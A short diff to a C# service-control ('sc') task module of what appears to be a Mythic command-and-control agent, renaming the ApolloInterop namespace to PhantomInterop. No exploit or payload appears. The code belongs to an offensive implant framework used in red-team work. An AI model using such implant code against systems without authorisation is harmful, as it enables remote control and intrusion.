@@ -6,10 +6,10 @@
 
 #if SC
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -579,7 +579,7 @@ namespace Tasks
         
         #endregion
         
-        public sc(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public sc(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             if (_pDeleteService == null)
             {
